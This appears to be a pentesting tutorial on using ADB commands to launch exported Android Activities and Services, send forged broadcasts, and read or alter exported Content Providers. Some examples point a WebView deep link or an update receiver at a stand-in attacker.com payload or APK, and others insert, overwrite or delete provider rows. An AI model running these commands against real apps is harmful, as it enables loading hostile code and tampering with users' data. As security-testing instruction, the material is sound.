When analyzing or pentesting an Android application, it is often necessary to interact directly with its **components** (Activities, Services, BroadcastReceivers, Content Providers). ADB (`adb shell am ...` and `adb shell content ...`) allows you to do this without modifying the app or writing code. This is especially useful to test exported components or those with weak permission controls.

---

## Starting an Activity

An **Activity** is a single screen in an Android application. If it is **exported** or has an Intent filter, it can be launched externally.

#### Syntax
```bash
adb shell am start -n <package>/<activity>
```

#### Common Flags

- `-a` → Action (e.g., `android.intent.action.VIEW`)
- `-d` → Data URI (deep link or resource)
- `--es` → String extra
- `--ei` → Integer extra
- `--ez` → Boolean extra
- `--esn` → Null string extra


### Examples

1. Start the main Activity:
```bash
adb shell am start -n com.example.app/.MainActivity
```

2. Open a WebView Activity with a malicious deep link:
```bash
adb shell am start -n com.example.app/.WebViewActivity \
    -a android.intent.action.VIEW \
    -d "http://attacker.com/payload.html"
```

3. Pass custom extras:
```bash
adb shell am start -n com.example.app/.LoginActivity \
    --es username "admin" \
    --es password "1234"
```


---

## Starting a Service

A **Service** runs in the background without UI. If **exported**, it can be invoked by an attacker.

#### Syntax
```bash
adb shell am startservice -n <package>/<service>
```

#### Examples

1. Start a background service:
```bash
adb shell am startservice -n com.example.app/.SyncService
```

2. Start a service with an action and parameters:
```bash
adb shell am startservice -n com.example.app/.BackgroundService \
    -a com.example.app.ACTION_SYNC \
    --es userId "42"
```


---

## Sending a Broadcast Intent

A **BroadcastReceiver** listens for system-wide messages (like WiFi connection changes, incoming SMS, etc.). If exported, an attacker can send **forged broadcasts**.

#### Syntax
```bash
adb shell am broadcast -n <package>/<receiver> -a <action>
```

#### Examples

1. Trigger a custom app broadcast:
```bash
adb shell am broadcast -n com.example.app/.MyReceiver \
    -a com.example.app.ACTION_NOTIFY \
    --es message "Hello from ADB"
```

2. Simulate system broadcasts:
```bash
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED
```

3. Send malicious extras:
```bash
adb shell am broadcast -n com.example.app/.UpdateReceiver \
    -a com.example.app.ACTION_UPDATE \
    --es url "http://attacker.com/update.apk"
```


---

## Querying an Exported Content Provider

A **Content Provider** manages structured app data (often backed by SQLite). If **exported**, it can be accessed externally.

#### Syntax
```bash
adb shell content query --uri content://<authority>/<path>
```

#### Examples

**Basic Query**
```bash
adb shell content query --uri content://com.example.app.provider/users
```

**Inserting Data**
Add a new row to the provider using `--bind` to specify column values:
```bash
adb shell content insert --uri content://com.example.app.provider/users \
    --bind "username:s:attacker" \
    --bind "password:s:1234"
```

**Updating Data**
Modify existing rows with `--where` to filter:
```bash
adb shell content update --uri content://com.example.app.provider/users \
    --where "id=1" \
    --bind "username:s:evil"
```

**Deleting Data**
Remove rows with `--where`:
```bash
adb shell content delete --uri content://com.example.app.provider/users \
    --where "id=1"
```

**Discover Providers**
```bash
adb shell dumpsys package com.example.app | grep provider
```
